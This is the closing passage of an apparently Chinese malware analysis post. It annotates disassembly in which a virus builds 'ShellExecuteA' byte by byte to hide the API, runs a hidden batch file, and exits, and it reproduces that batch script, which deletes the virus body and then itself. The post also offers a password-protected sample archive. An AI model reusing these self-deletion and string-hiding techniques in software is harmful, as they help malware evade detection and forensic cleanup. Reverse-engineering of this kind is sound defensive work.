00403A38  |.  C645 94 53           mov     byte ptr [ebp-6C], 53
00403A3C  |.  51                   push    ecx
00403A3D  |.  50                   push    eax
00403A3E  |.  C645 95 68           mov     byte ptr [ebp-6B], 68                 ;  ShellExecuteA
00403A42  |.  C645 96 65           mov     byte ptr [ebp-6A], 65
00403A46  |.  C645 97 6C           mov     byte ptr [ebp-69], 6C
00403A4A  |.  C645 98 6C           mov     byte ptr [ebp-68], 6C
00403A4E  |.  C645 99 45           mov     byte ptr [ebp-67], 45
00403A52  |.  C645 9A 78           mov     byte ptr [ebp-66], 78
00403A56  |.  C645 9B 65           mov     byte ptr [ebp-65], 65
00403A5A  |.  C645 9C 63           mov     byte ptr [ebp-64], 63
00403A5E  |.  C645 9D 75           mov     byte ptr [ebp-63], 75
00403A62  |.  C645 9E 74           mov     byte ptr [ebp-62], 74
00403A66  |.  C645 9F 65           mov     byte ptr [ebp-61], 65
00403A6A  |.  C645 A0 41           mov     byte ptr [ebp-60], 41
00403A6E  |.  885D A1              mov     byte ptr [ebp-5F], bl
00403A71  |.  E8 BBDEFFFF          call    00401931                              ;  GetProcAddress ShellExecuteA
00403A76  |.  59                   pop     ecx
00403A77  |.  59                   pop     ecx
00403A78  |.  53                   push    ebx                                   ;  SW_HIDE
00403A79  |.  53                   push    ebx
00403A7A  |.  8D8D 40FEFFFF        lea     ecx, dword ptr [ebp-1C0]
00403A80  |.  53                   push    ebx
00403A81  |.  51                   push    ecx                                   ;  "临时文件路径\\tempVidio.bat"
00403A82  |.  8D4D F4              lea     ecx, dword ptr [ebp-C]
00403A85  |.  51                   push    ecx                                   ;  open
00403A86  |.  53                   push    ebx                                   ;  0
00403A87  |.  FFD0                 call    eax                                   ;  ShellExecuteA 以隐藏方式启动 删除病毒体和本 bat
00403A89  |.  9C                   pushfd
00403A8A  |.  9D                   popfd
00403A8B  |.  53                   push    ebx                                   ; /ExitCode
00403A8C  \.  FF15 20604000        call    dword ptr [<&kernel32.ExitProcess>]   ; \ExitProcess
```



最后附上 `bat` 内容，非常简单，就是两条删除操作~

代码:

```
@echo off
:try
del "这里是用 GetModuleFileName 得到的病毒本体路径"
if exist "这里是用 GetModuleFileName 得到的病毒本体路径" goto try

del "临时文件路径\\tempVidio.bat"
```

`lzg123.rar` [解压密码是：`kill_virus`]

病毒样本
